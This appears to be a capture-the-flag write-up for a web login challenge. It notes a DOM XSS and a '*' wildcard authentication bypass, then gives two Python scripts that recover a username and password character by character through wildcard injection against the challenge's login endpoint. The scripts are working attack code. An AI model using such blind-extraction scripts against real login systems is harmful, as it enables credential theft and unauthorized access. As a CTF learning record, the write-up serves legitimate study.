
there was a html injection which can transfer into a xss (actually it is a DOM:XSS )
but it is useless ,because the flag does not in there 

the backend technology cannot guess so  just tried to exploit with SQLI , the result is the ' * ' mark can bypass the login page ,but without priviledges

so now we have to brute force the username and the password.

ran 2 manually coded scripts ,for both username and the password

## username_bruteforce.py

```python
import requests

char_list = [
    'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 
    'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
    'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M',
    'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
    '0', '1', '2', '3', '4', '5', '6', '7', '8', '9',
    '!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '-', '_', '+', '=', '[', ']', '{', '}', '|', '\\', ';', ':', "'", '"', ',', '.', '<', '>', '/', '?', '`', '~'
]

url = 'http://157.245.39.76:32142/login'
myobj = {'username': 'somevalue', 'password': '*'}
result = ''

flag = 1
while flag == 1:
    flag = 0
    for char in char_list:
        myobj['username'] = result + char + '*'
        r = requests.post(url, data=myobj, proxies={'http': 'http://127.0.0.1:8080'})
        if 'No search results' in r.text:
            result += char
            flag = 1
            print(result)
            break

print('Finish!!')

```

## password_bruteforce.py
```python
import requests

char_list = [
    'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 
    'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
    'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M',
    'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
    '0', '1', '2', '3', '4', '5', '6', '7', '8', '9',
    '!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '-', '_', '+', '=', '[', ']', '{', '}', '|', '\\', ';', ':', "'", '"', ',', '.', '<', '>', '/', '?', '`', '~'
]

url = 'http://157.245.39.76:32142/login'
myobj = {'username': 'reese', 'password': 'somevalue'}
result = ''

flag = 1
while flag == 1:
    flag = 0
    for char in char_list:
        myobj['password'] = result + char + '*'
        r = requests.post(url, data=myobj, proxies={'http': 'http://127.0.0.1:8080'})
        if 'No search results' in r.text:
            result += char
            flag = 1
            print(result)
            break

print('Finish!!')

```

the password result gave the flag. :)
